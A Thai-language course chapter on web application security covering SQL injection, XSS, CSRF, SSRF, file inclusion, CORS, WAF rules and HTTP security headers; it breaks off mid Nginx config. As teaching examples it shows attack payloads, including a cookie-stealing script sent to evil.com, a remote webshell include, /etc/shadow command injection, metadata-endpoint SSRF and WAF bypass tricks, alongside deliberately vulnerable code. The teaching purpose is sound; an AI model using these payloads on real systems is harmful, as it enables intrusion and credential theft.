# CH-9: การรักษาความปลอดภัยสำหรับเว็บและแอปพลิเคชัน

## วัตถุประสงค์การเรียนรู้ (Learning Objectives)

เมื่อจบบทนี้แล้ว ผู้เรียนสามารถ:
1. อธิบายภัยคุกคามทางเว็บที่สำคัญ — SQL Injection, XSS, CSRF, SSRF — และแนวทางการป้องกันได้
2. อธิบายหลักการ Same-Origin Policy และการทำงานของ CORS ได้
3. อธิบายการทำงานของ TLS/SSL บนเว็บเซิร์ฟเวอร์ รวมถึง TLS Termination และ Offloading ได้
4. กำหนดค่า Web Application Firewall (WAF) เพื่อป้องกันการโจมตีทางเว็บได้
5. กำหนดค่า HTTP Security Headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options) ได้
6. เขียน Content Security Policy (CSP) ที่เหมาะสมกับแอปพลิเคชันได้
7. วิเคราะห์กรณีศึกษาการโจมตีเว็บไซต์จริงและเสนอแนวทางการป้องกันได้

---

# ส่วนที่ 1: ภัยคุกคามทางเว็บ

## 1. ภาพรวมของ Web Application Security

### 1.1 เหตุใด Web Application จึงตกเป็นเป้าหมาย

- เว็บแอปพลิเคชันเข้าถึงได้จากอินเทอร์เน็ต — ทุกคนสามารถโจมตีได้
- ช่องโหว่ Web แพร่หลาย — OWASP Top 10 แสดงให้เห็นถึงปัญหาที่เกิดซ้ำแล้วซ้ำเล่า
- ผลกระทบรุนแรง — ข้อมูลผู้ใช้, ข้อมูลบัตรเครดิต, Credentials, ระบบภายใน

### 1.2 พื้นฐาน HTTP Protocol

HTTP (HyperText Transfer Protocol) เป็น Protocol แบบ Request-Response ที่ไม่มี State (Stateless):

```
HTTP Request Structure:
───────────────────────
POST /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=secret

HTTP Response Structure:
────────────────────────
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789; HttpOnly; Secure

<html>Welcome, admin!</html>
```

**ความปลอดภัยของ HTTP:**
- HTTP ปกติ (Port 80) — ไม่เข้ารหัส — ทุกคนที่อยู่บนเส้นทางสามารถอ่านได้
- HTTPS (HTTP over TLS — Port 443) — เข้ารหัสด้วย TLS — ป้องกัน Eavesdropping และ Tampering

---

## 2. SQL Injection (SQLi)

### 2.1 หลักการ

SQL Injection เกิดเมื่อผู้โจมตีสามารถแทรกคำสั่ง SQL ผ่าน Input ที่ผู้ใช้สามารถควบคุมได้ เข้าไปยัง Database Query โดยตรง — ถ้าแอปพลิเคชันไม่ได้ทำ Sanitization หรือใช้ Parameterized Query

### 2.2 ตัวอย่างการโจมตี

**ช่องโหว่ — Dynamic Query Construction:**

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

// ❌ ช่องโหว่ — ไม่ใช้ Parameterized Query
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Login successful!";
} else {
    echo "Login failed!";
}
?>
```

**การโจมตี — ผู้ใช้ป้อน:**
```
Username: admin' --
Password: anything
```

**คำสั่ง SQL ที่เกิดขึ้น:**
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```
`--` คือ SQL Comment — ทำให้ส่วนที่เหลือถูกมองข้าม — Login สำเร็จในฐานะ `admin`

**การโจมตีขั้นสูง — UNION Based SQLi:**
```
Username: ' UNION SELECT username, password FROM users --
```
```sql
SELECT * FROM users WHERE username='' UNION SELECT username, password FROM users --'
```
— ดึง Username และ Password ของผู้ใช้ทั้งหมด

**การโจมตีแบบ Blind SQLi (Boolean-based):**
```
Username: admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
```
— ทาย Password ทีละตัวอักษร โดยดูจาก Response ของเซิร์ฟเวอร์ (True/False)

### 2.3 ประเภทของ SQL Injection

| ประเภท | คำอธิบาย | ตัวอย่าง |
|:-------|:---------|:---------|
| **In-band (Classic)** | ใช้ Channel เดียวกันในการโจมตีและรับผลลัพธ์ | UNION SELECT — ผลลัพธ์แสดงบนหน้าเว็บ |
| **Blind (Inferential)** | ไม่เห็นผลลัพธ์โดยตรง — อนุมานจาก Behavior | Boolean-based, Time-based |
| **Out-of-band** | ใช้ Channel แยกในการรับข้อมูล | DNS Lookup, HTTP Request ไปยัง Server ของผู้โจมตี |
| **Error-based** | ใช้ Error Message จาก DB เพื่อหาข้อมูล | `CONVERT(int,@@version)` — Error แสดง Version |
| **Stacked Query** | รันหลาย Query ในครั้งเดียว | `'; DROP TABLE users; --` |

### 2.4 แนวทางการป้องกัน

```
✅ DO:
├── ใช้ Parameterized Query (Prepared Statements) — บังคับ
├── ใช้ ORM (Object-Relational Mapping) — ลดการเขียน SQL โดยตรง
├── ใช้ Stored Procedure
├── Input Validation — ตรวจสอบชนิดและรูปแบบข้อมูล
├── Least Privilege — DB User มีสิทธิ์เฉพาะเท่าที่จำเป็น
└── WAF — ใช้ Web Application Firewall เป็นแนวป้องกันเพิ่ม

❌ DON'T:
├── ต่อ String SQL โดยตรง — ❌ "$query = WHERE id=$id"
├── ใช้ Dynamic SQL โดยไม่มีการ Escape
├── แสดง Database Error โดยตรงต่อผู้ใช้
└── ใช้ Admin/Superuser DB Account ใน Application
```

**ตัวอย่าง Parameterized Query (ปลอดภัย):**

```php
<?php
// ✅ ใช้ Prepared Statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    echo "Login successful!";
}
?>
```

```sql
-- ✅ Java JDBC PreparedStatement
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

---

## 3. Cross-Site Scripting (XSS)

### 3.1 หลักการ

XSS เกิดเมื่อผู้โจมตีสามารถแทรก **JavaScript (หรือ HTML/CSS)** ที่เป็นอันตรายเข้าไปในหน้าเว็บที่ผู้ใช้รายอื่นเปิดดู — Script จะทำงานใน Browser ของเหยื่อด้วยสิทธิ์ของเว็บนั้น

### 3.2 ประเภทของ XSS

**1. Reflected XSS (Non-Persistent):**

Payload อยู่ใน Request (URL, Form) และสะท้อนกลับมาใน Response ทันที — ต้องให้เหยื่อคลิก Link ที่ผู้โจมตีสร้างขึ้น

```
URL:  https://example.com/search?q=<script>alert('XSS')</script>
Response:  <html>ผลการค้นหา: <script>alert('XSS')</script></html>
```

**2. Stored XSS (Persistent):**

Payload ถูกบันทึกใน Database และแสดงเมื่อผู้ใช้เปิดหน้าเว็บนั้น — รุนแรงที่สุด เพราะไม่ต้องหลอกให้คลิก Link

```
ช่องโหว่: ช่องแสดงความคิดเห็น (Comment Box)
Payload ที่บันทึก:  <script>document.location='https://evil.com/steal.php?c='+document.cookie</script>

ผู้ใช้ A: เปิดหน้าเว็บ → Script ทำงาน → Cookie ถูกส่งไปยัง evil.com
```

**3. DOM-based XSS:**

Payload ทำงานผ่าน DOM ใน Browser โดยที่ Server ไม่ได้ส่ง HTML ที่มีอันตราย — เกิดจาก JavaScript ฝั่ง Client ที่เขียนข้อมูลจาก Source ที่ไม่น่าเชื่อถือ (location.hash, document.referrer) ลงใน DOM

```javascript
// ❌ ช่องโหว่ DOM-based XSS — ใช้ innerHTML โดยตรง
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Welcome, ' + name;

// URL: https://example.com/#<img src=x onerror=alert(1)>
// → Script ทำงานโดย Server ไม่รู้เรื่อง
```

### 3.3 ตารางเปรียบเทียบ XSS

| ประเภท | Persistence | ต้องให้เหยื่อคลิก | Server Side Logic | Severity |
|:-------|:-----------:|:-----------------:|:-----------------:|:--------:|
| Reflected XSS | ❌ ไม่เก็บ | ✅ ต้องคลิก Link | เกี่ยวข้อง | ปานกลาง |
| Stored XSS | ✅ เก็บใน DB | ❌ ไม่ต้อง | เกี่ยวข้อง | สูงมาก |
| DOM-based XSS | ขึ้นอยู่กับ Code | ขึ้นอยู่กับ Code | ไม่เกี่ยวข้อง | ปานกลาง-สูง |

### 3.4 แนวทางการป้องกัน

```
✅ DO:
├── Output Encoding — แปลง Special Characters ก่อนแสดงผล
│   └── < → &lt;   > → &gt;   " → &quot;   ' → &#39;   & → &amp;
├── Context-Aware Encoding — Encoding ตามตำแหน่งที่แทรก (HTML, Attribute, JS, CSS, URL)
├── Content Security Policy (CSP) — จำกัดแหล่งที่มาของ Script
├── HttpOnly Cookie — Cookie ไม่สามารถเข้าถึงได้จาก JavaScript
├── DOMPurify — Sanitize HTML ก่อนแทรกลง DOM
└── Input Validation — อย่างน้อยเป็น Secondary Defense

❌ DON'T:
├── ใช้ innerHTML, document.write, eval() กับข้อมูลจากผู้ใช้
├── เชื่อว่า Server-Side Validation เพียงพอ — XSS ทำงานฝั่ง Client
├── ไว้ใจ URL Parameter ว่าไม่เป็นอันตราย
└── แสดง Raw User Input โดยไม่มีการ Sanitize
```

**ตัวอย่าง Output Encoding (ภาษา Java — JSP):**
```jsp
<%-- ❌ ไม่ปลอดภัย --%>
<%= request.getParameter("name") %>

<%-- ✅ ปลอดภัย (HTML Entity Encoding) --%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<c:out value="${param.name}" />

<%-- ✅ กำหนด Context Encoding --%>
<script>var name = '<c:out value="${param.name}" />';</script>
```

**ตัวอย่าง Output Encoding (ภาษา Python — Django):**
```python
# Django Template — Auto Escape (เปิดโดย default)
# ถ้าใน view:
context = {'user_input': '<script>alert(1)</script>'}

# ใน template:
{{ user_input }}  
# → &lt;script&gt;alert(1)&lt;/script&gt;  (ปลอดภัย)

# ❌ ถ้าต้องการ Raw HTML (ต้องแน่ใจว่าปลอดภัย):
{{ user_input|safe }}  # ไม่แนะนำถ้าไม่แน่ใจ
```

---

## 4. Cross-Site Request Forgery (CSRF)

### 4.1 หลักการ

CSRF (หรือ XSRF) เกิดเมื่อผู้โจมตีหลอกให้ผู้ใช้ที่ **กำลังล็อกอินอยู่ในเว็บนั้น** ส่ง Request ที่ไม่พึงประสงค์ไปยังเว็บ — โดยที่เว็บไม่สามารถแยกแยะว่า Request นั้นมาจากผู้ใช้จริงหรือถูกปลอมแปลง

### 4.2 ตัวอย่างการโจมตี

**สถานการณ์:** ผู้ใช้กำลังล็อกอินในธนาคารออนไลน์ (ยังไม่ Logout) แล้วเปิดเว็บอันตราย

```html
<!-- เว็บอันตราย — มีรูปภาพ (Image Tag) ที่ส่ง Request ไปยังธนาคาร -->
<img src="https://bank.example.com/transfer?to=attacker&amount=10000" 
     width="0" height="0" />
```

**สิ่งที่เกิดขึ้น:**
1. Browser ของผู้ใช้ส่ง Request ไปยัง `bank.example.com`
2. Cookie ของธนาคารถูกแนบไปโดยอัตโนมัติ (Same Origin Policy บังคับเฉพาะ JavaScript ไม่บังคับ Tag)
3. เซิร์ฟเวอร์ธนาคารเห็น Cookie ที่ถูกต้อง → คิดว่าเป็น Request จากผู้ใช้จริง
4. เงิน 10,000 บาทถูกโอนไปยังบัญชีผู้โจมตี

### 4.3 เงื่อนไขที่ทำให้ CSRF สำเร็จ

1. ผู้ใช้กำลังล็อกอินอยู่ใน Target Site (มี Session Cookie)
2. Target Site ไม่มี CSRF Token หรือ Token Validation ที่เพียงพอ
3. ผู้ใช้เปิดเว็บที่เป็นอันตราย (หรืออีเมล phishing)

### 4.4 แนวทางการป้องกัน

**1. CSRF Token (Synchronizer Token Pattern):**

```html
<!-- Server สร้าง Token แบบสุ่มและแนบใน Form -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="R4nd0mT0k3n!@#$" />
    <input type="text" name="to_account" />
    <input type="number" name="amount" />
    <input type="submit" value="โอนเงิน" />
</form>
```

```python
# Flask — ใช้ Flask-WTF (CSRF Protection)
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# หรือตรวจสอบ Token ด้วยตัวเอง
@app.route('/transfer', methods=['POST'])
def transfer():
    token = request.form.get('csrf_token')
    if not token or token != session['csrf_token']:
        abort(403)  # Forbidden
    # ดำเนินการโอนเงิน...
```

**2. SameSite Cookie Attribute:**
```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

| SameSite Value | คำอธิบาย |
|:---------------|:---------|
| `Strict` | Cookie ไม่ถูกส่งใน Cross-Site Request ทุกประเภท — ปลอดภัยที่สุดแต่ UX แย่ (Link จาก Email ก็ไม่ส่ง Cookie) |
| `Lax` (Default) | Cookie ถูกส่งเฉพาะ Top-level Navigation (GET, Link) — ไม่ส่งด้วย POST จาก Cross-Site |
| `None` | Cookie ถูกส่งทุก Cross-Site Request — ต้องใช้ร่วมกับ Secure (HTTPS Only) |

**3. Custom Header Validation:**
```javascript
// ✅ ส่ง Custom Header ด้วย JavaScript (CSRF Protected)
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({to: 'attacker', amount: 10000})
});
// Browser SOP ป้องกันไม่ให้ Custom Header ถูกส่งจาก Cross-Origin
```

**4. Double Submit Cookie:**
- ส่ง Random Token ทั้งใน Cookie และ Request Body/Header
- Server ตรวจสอบว่าทั้งสองค่า match กัน

---

## 5. Server-Side Request Forgery (SSRF)

### 5.1 หลักการ

SSRF เกิดเมื่อผู้โจมตีสามารถบังคับให้ **Server ทำ Request ไปยัง URL ที่ผู้โจมตีกำหนด** — ทำให้ผู้โจมตีสามารถเข้าถึงระบบภายในที่ปกติไม่สามารถเข้าถึงได้จากภายนอก

### 5.2 ตัวอย่างการโจมตี

**ช่องโหว่ — แอปพลิเคชันที่รับ URL และ Fetch มาแสดงผล:**

```php
<?php
// ❌ ช่องโหว่ SSRF — ไม่ตรวจสอบ URL
$url = $_GET['url'];
$content = file_get_contents($url);  // Fetch URL ใดก็ได้
echo $content;
?>
```

**การโจมตี — เข้าถึง Internal Service:**
```
URL: https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
→ AWS Metadata Endpoint (Internal) — ข้อมูล Credentials ของ Cloud Server!

URL: https://example.com/fetch?url=http://localhost:9200/
→ Elasticsearch API (Internal) — อาจดึงข้อมูลจาก Database!

URL: https://example.com/fetch?url=file:///etc/passwd
→ Local File Read — ใช้ file:// protocol อ่านไฟล์ภายใน Server
```

### 5.3 ประเภทของ SSRF

| ประเภท | คำอธิบาย | ตัวอย่าง |
|:-------|:---------|:---------|
| **Basic SSRF** | Response ถูกส่งกลับมายังผู้โจมตี | URL → Internal Service → Response แสดงผล |
| **Blind SSRF** | ไม่เห็น Response — ต้องใช้ Side Channel | URL → Internal Service → Time delay หรือ Error |
| **Semi-Blind SSRF** | Response บางส่วน — ใช้ Error Message | URL → Internal Service → Error ที่เปิดเผยข้อมูล |

### 5.4 แนวทางการป้องกัน

```
✅ DO:
├── Whitelist URLs ที่อนุญาตให้ Fetch — ดีที่สุด
├── Block Private/RFC 1918 IPs: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
├── Block Localhost: 127.0.0.1, ::1, localhost
├── Block Metadata Endpoints: 169.254.169.254 (AWS/Azure/GCP)
├── Validate URL Scheme: อนุญาตเฉพาะ http/https — ป้องกัน file://, ftp://, dict://
├── DNS Resolution Validation — ป้องกัน DNS Rebinding Attack
├── Network Segmentation — Internal Services ไม่ควรเข้าถึงได้จาก App Server โดยตรง
└── Disable Redirect Following — ผู้โจมตีใช้ Redirect หลบ Blacklist

❌ DON'T:
├── รับ URL จากผู้ใช้โดยตรงโดยไม่ตรวจสอบ — ❌
├── ใช้ Blacklist URLs (หลบเลี่ยงได้ง่าย — DNS Rebinding, IPv6, URL Encoding)
├── แสดง Response ที่มาจาก Internal Service โดยตรง
└── วาง Metadata Endpoint ไว้ใน Network ที่ App Server เข้าถึงได้
```

---

## 6. การโจมตีทางเว็บอื่นๆ (เพิ่มเติม)

### 6.1 Local File Inclusion (LFI) / Remote File Inclusion (RFI)

```
LFI: รวมไฟล์ในเครื่องเมื่อ Application รับ Path จากผู้ใช้
URL: https://example.com/page?file=../../../etc/passwd
→ อ่านไฟล์ /etc/passwd

RFI: รวมไฟล์จาก Remote Server 
URL: https://example.com/page?file=http://evil.com/shell.txt
→ รวม Webshell จาก Server ภายนอก (รุนแรงมาก — RCE)
```

### 6.2 Command Injection

```
ผู้โจมตีสั่งคำสั่ง OS ผ่าน Input ของเว็บแอปพลิเคชัน
URL: https://example.com/ping?ip=8.8.8.8;cat /etc/shadow
→ Server รัน: ping -c 4 8.8.8.8;cat /etc/shadow
→ พิมพ์เนื้อหา /etc/shadow
```

### 6.3 Path Traversal (Directory Traversal)

```
การเข้าถึงไฟล์ที่อยู่นอก Web Root Directory
URL: https://example.com/static/../../../etc/passwd
→ อ่าน /etc/passwd จาก Web Server
```

### 6.4 Insecure Deserialization

```
การโจมตี Serialized Object ที่ถูกส่งจาก Client ไปยัง Server
— ใช้ใน Java, PHP, Python, .NET
— PHP: unserialize(), Java: readObject()
— อาจนำไปสู่ RCE (Remote Code Execution)
```

---

# ส่วนที่ 2: การป้องกันเว็บแอปพลิเคชัน

## 7. Same-Origin Policy (SOP) และ CORS

### 7.1 Same-Origin Policy (SOP)

SOP คือกลไกความปลอดภัยพื้นฐานของ Browser ที่จำกัดการทำงานของ Script จาก Origin หนึ่ง ในการเข้าถึง Resource จากอีก Origin หนึ่ง

**Origin = Protocol + Host + Port**

```
https://example.com:443
    ↕          ↕       ↕
  Protocol   Host    Port

เปรียบเทียบ Origin:
──────────────────────
https://example.com/page1.html
https://example.com/page2.html
→ ✅ Same Origin (Protocol, Host, Port เหมือนกัน)

https://example.com
http://example.com
→ ❌ Different Origin (Protocol ต่างกัน — https vs http)

https://example.com
https://api.example.com
→ ❌ Different Origin (Host ต่างกัน)
```

### 7.2 ข้อยกเว้นของ SOP (SOP DOES NOT BLOCK)

SOP **ไม่** ป้องกันการกระทำเหล่านี้ (เพราะอาศัย HTML Tags ไม่ใช่ JavaScript):

```html
<!-- ✅ Cross-Origin Request ที่ SOP อนุญาต -->
<img src="https://other-site.com/image.jpg">     <!-- Image -->
<link rel="stylesheet" href="https://other-site.com/style.css">  <!-- CSS -->
<script src="https://other-site.com/analytics.js"></script>  <!-- JS -->
<form action="https://other-site.com/login" method="POST">  <!-- Form -->
<!-- เบราว์เซอร์จะส่ง Request แต่ JavaScript ไม่สามารถอ่าน Response ได้ -->
```

นี่คือสาเหตุที่ CSRF ทำงานได้ — Form และ Image Tag ข้าม Origin ได้

### 7.3 CORS (Cross-Origin Resource Sharing)

CORS เป็นกลไกที่ผ่อนปรนข้อจำกัดของ SOP โดยใช้ HTTP Headers เพื่อบอก Browser ว่า "Origin นี้ได้รับอนุญาตให้เข้าถึง Resource ของเราได้"

**CORS Request Flow (Preflight):**

```http
OPTIONS /api/data HTTP/1.1
Origin: https://frontend.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.example.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

**Simple Request (GET/POST with limited Content-Type):**

```http
GET /api/data HTTP/1.1
Origin: https://frontend.example.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://frontend.example.com
Access-Control-Allow-Credentials: true
```

### 7.4 แนวทางการกำหนดค่า CORS

```
✅ DO:
├── ระบุ Origin เจาะจง — ❌ อย่าใช้ * สำหรับ Credential Requests
├── ถ้าใช้ Credential (cookie): origin + Access-Control-Allow-Credentials:true
├── จำกัด Methods — เปิดให้เฉพาะที่จำเป็น (GET, POST)
├── จำกัด Headers — เปิดให้เฉพาะที่จำเป็น
├── ใช้ Vary: Origin Header — สำหรับ Caching
└── ใช้ SPA Proxy (Nginx) จัดการ CORS แทน Application

❌ DON'T:
├── Access-Control-Allow-Origin: * (สำหรับ API ที่ต้อง Authentication)
├── Access-Control-Allow-Origin: null (อันตราย — iframe sandbox ใช้ null origin)
├── เชื่อว่า CORS ป้องกัน CSRF — ไม่ได้! (Form-based CSRF ไม่ใช้ JavaScript)
└── Mirror Origin โดยไม่ตรวจสอบ (REST API ที่ echo Origin กลับไป)
```

---

## 8. Web Application Firewall (WAF)

### 8.1 หลักการทำงานของ WAF

WAF คือระบบรักษาความปลอดภัยที่ทำงานใน Layer 7 (Application Layer) คอยตรวจสอบ HTTP/HTTPS Traffic ระหว่าง Client และ Web Server เพื่อตรวจจับและป้องกันการโจมตีทางเว็บ

```
WAF Deployment:
────────────────
[Client] ──▶ [WAF] ──▶ [Web Server]
                 │
           ตรวจสอบ Request:
           ├── SQL Injection → Block
           ├── XSS → Block
           ├── CSRF → Block/Challenge
           ├── LFI/RFI → Block
           └── Normal → Forward
```

### 8.2 โหมดการทำงานของ WAF

| โหมด | การทำงาน | เหมาะกับ |
|:-----|:---------|:--------|
| **Blocking Mode** | บล็อก Traffic ที่เป็นอันตราย | Production — หลังจาก Tuning |
| **Detection Mode** | แจ้งเตือนอย่างเดียว ไม่บล็อก | เริ่มต้นใช้งาน — เก็บ Baseline |
| **Learning Mode** | เรียนรู้ Traffic ปกติเพื่อสร้าง Profile | การปรับตั้งค่า WAF |
| **Logging Mode** | บันทึกทุก Request พร้อมคะแนนความเสี่ยง | Forensic, Compliance |

### 8.3 ประเภทของ WAF

```
┌────────────────────────────────────────────────────────────┐
│                    WAF ประเภทต่างๆ                          │
│                                                            │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐           │
│  │Network WAF  │  │ Host WAF   │  │ Cloud WAF   │          │
│  │(Hardware)   │  │(Software)  │  │(SaaS)       │          │
│  ├────────────┤  ├────────────┤  ├────────────┤           │
│  │ F5 ASM     │  │ ModSecurity│  │ Cloudflare  │          │
│  │ Imperva    │  │ NAXSI      │  │ AWS WAF     │          │
│  │ FortiWeb   │  │ libinjection│  │ Akamai WAF  │          │
│  └────────────┘  └────────────┘  └────────────┘           │
└────────────────────────────────────────────────────────────┘
```

| ประเภท | จุดเด่น | จุดอ่อน |
|:-------|:-------|:--------|
| **Network WAF** | Performance สูง, Central Management | ราคาแพง, Hardware Maintenance |
| **Host WAF** | ต้นทุนต่ำ, ยืดหยุ่น, Open Source | ใช้ทรัพยากร Server, ต้องติดตั้งเอง |
| **Cloud WAF** | ดูแลง่าย, Auto-scale, CDN Integration | ค่าใช้จ่ายตามปริมาณ Traffic, Data Privacy |

### 8.4 ModSecurity + OWASP CRS

**ModSecurity** คือ Open Source WAF Engine ที่ทำงานร่วมกับ Web Server (Apache, Nginx, IIS)
**OWASP CRS (Core Rule Set)** คือชุดกฎสำหรับ ModSecurity ที่ครอบคลุม OWASP Top 10

**การติดตั้ง ModSecurity + CRS:**

```bash
# ติดตั้ง ModSecurity
sudo apt install libapache2-mod-security2

# ดาวน์โหลด OWASP CRS
git clone https://github.com/coreruleset/coreruleset /etc/modsecurity/crs

# ตั้งค่า CRS
cp /etc/modsecurity/crs/crs-setup.conf.example /etc/modsecurity/crs/crs-setup.conf
```

**ตัวอย่าง Rule ใน CRS:**

```apache
# SQL Injection Detection (CRS Rule 942100)
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@detectSQLi" \
    "id:942100,\
    phase:2,\
    block,\
    t:none,t:utf8toUnicode,t:urlDecodeUni,t:removeNulls,\
    msg:'SQL Injection Detected via libinjection',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli',\
    tag:'paranoia-level/1',\
    tag:'OWASP_CRS',\
    ver:'OWASP_CRS/4.0.0',\
    severity:'CRITICAL',\
    setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
```

**Anomaly Scoring:**
CRS ใช้ระบบคะแนน — Request ที่มีคะแนนรวมเกิน Threshold จะถูก Block:

```
Normal:      0-5 points   →  Allow
Suspicious:  5-10 points  →  Log + Maybe Block
Critical:    10+ points   →  Block + Alert
```

### 8.5 WAF Bypass Techniques

ผู้โจมตีพยายามหลบเลี่ยง WAF ด้วยเทคนิคต่างๆ:

| เทคนิค WAF Bypass | ตัวอย่าง |
|:------------------|:---------|
| **Encoding** | `%27%20OR%201%3D1%20--` (URL Encode), `0x27204f52...` (Hex) |
| **Case Variation** | `SeLeCt * FrOm users` (ผสมตัวพิมพ์) |
| **Comment Injection** | `SEL/**/ECT * FROM users` |
| **HTTP Parameter Pollution** | `?id=1&id=2 UNION SELECT...` (บาง WAF ตรวจเฉพาะค่าแรก) |
| **HTTP Method Manipulation** | ใช้ PUT/PATCH แทน POST (ถ้า WAF ตรวจเฉพาะ POST) |
| **Content-Type Bypass** | ใช้ `application/json` แทน `application/x-www-form-urlencoded` |
| **Unicode Normalization** | `ſ` = `s` (Unicode Case Mapping) |
| **Large Payload** | ส่ง Payload ขนาดใหญ่ — WAF อาจข้ามการตรวจสอบ |

---

## 9. HTTP Security Headers

### 9.1 ภาพรวม

HTTP Security Headers คือ Headers ที่ Web Server ส่งไปยัง Browser เพื่อบอก Browser ให้ใช้มาตรการรักษาความปลอดภัยบางอย่าง

### 9.2 HTTP Strict Transport Security (HSTS)

บอก Browser ว่าเว็บไซต์นี้ต้องใช้ HTTPS เท่านั้น — ห้ามใช้ HTTP:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

| Directive | คำอธิบาย |
|:----------|:---------|
| `max-age=SECONDS` | ระยะเวลา (วินาที) ที่ Browser จดจำว่าเว็บนี้ใช้ HTTPS — 31536000 = 1 ปี |
| `includeSubDomains` | ใช้กับ Subdomain ทั้งหมด (https://mail.example.com, https://api.example.com) |
| `preload` | ลงทะเบียนกับ Browser — Browser จะบังคับ HTTPS ก่อนเปิดเว็บครั้งแรก |

**ประโยชน์ของ HSTS:**
- ป้องกัน SSL Stripping Attack — Man-in-the-Middle ที่ Downgrade HTTPS → HTTP
- ป้องกัน Cookie Hijacking ผ่าน HTTP

### 9.3 X-Frame-Options

ป้องกัน Clickjacking — ห้ามไม่ให้หน้าเว็บถูกแสดงใน `<iframe>` ของเว็บอื่น:

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

| ค่า | คำอธิบาย |
|:----|:---------|
| `DENY` | ไม่สามารถแสดงใน Frame ใดๆ เลย |
| `SAMEORIGIN` | แสดงใน Frame ที่เป็น Same Origin เท่านั้น |
| `ALLOW-FROM uri` | (Deprecated) — ใช้ CSP frame-ancestors แทน |

### 9.4 X-Content-Type-Options

ป้องกัน MIME Type Sniffing — Browser จะไม่พยายามเปลี่ยน Content-Type:

```
X-Content-Type-Options: nosniff
```

**ปัญหา MIME Sniffing:**
ผู้โจมตีอัปโหลดไฟล์ `image.jpg` ที่มี JavaScript ซ่อนอยู่ — Browser อาจ render เป็น HTML แทน

### 9.5 Content Security Policy (CSP)

CSP คือ Header ที่ควบคุมแหล่งที่มาของ Resource ที่ Browser สามารถโหลดและรันได้:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; frame-ancestors 'none'
```

### 9.6 CSP Directive ที่สำคัญ

| Directive | ควบคุม | ตัวอย่าง |
|:----------|:-------|:---------|
| `default-src` | ค่าเริ่มต้นสำหรับทุก Resource ถ้าไม่ได้ระบุ Directive เฉพาะ | `default-src 'self'` |
| `script-src` | JavaScript | `script-src 'self' https://trusted-cdn.com` |
| `style-src` | CSS | `style-src 'self' 'unsafe-inline'` |
| `img-src` | รูปภาพ | `img-src 'self' data: https://*.imgur.com` |
| `connect-src` | XMLHttpRequest, fetch, WebSocket | `connect-src 'self' https://api.example.com` |
| `frame-src` | iframe | `frame-src 'none'` |
| `frame-ancestors` | ใครสามารถ embed หน้านี้ใน iframe | `frame-ancestors 'none'` |
| `object-src` | `<object>`, `<embed>`, `<applet>` | `object-src 'none'` |
| `base-uri` | `<base>` tag | `base-uri 'self'` |
| `form-action` | ปลายทางของ Form submission | `form-action 'self'` |
| `report-uri` / `report-to` | URL ส่งรายงานเมื่อ Policy ถูก Violate | `report-uri /csp-violation` |

### 9.7 ตัวอย่างการกำหนดค่า CSP

**CSP สำหรับ Web Application ทั่วไป:**

```
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://www.google-analytics.com 'nonce-ABC123';
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    img-src 'self' data: https://www.google-analytics.com;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
    object-src 'none';
```

**CSP ในการ Report Mode (ไม่ Block, แค่ Report):**

```
Content-Security-Policy-Report-Only:
    default-src 'self';
    script-src 'self';
    report-uri /csp-report-endpoint;
```

### 9.8 การใช้ Nonce ใน CSP

Nonce คือค่าสุ่มที่เปลี่ยนทุก Request — ใช้บอก Browser ว่า Script ไหนได้รับอนุญาต:

```html
<!-- Server สร้าง Nonce ทุก Request -->
<script nonce="ABC123">
    // Script นี้ได้รับอนุญาต
    console.log('safe script');
</script>

<!-- Attack Script (ไม่มี nonce หรือ nonce ผิด) → ถูก Block -->
<script>
    alert('XSS');
</script>
```

### 9.9 ตัวอย่างการกำหนดค่า All-in-One (Nginx)

```nginx
# ใน Server Block
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
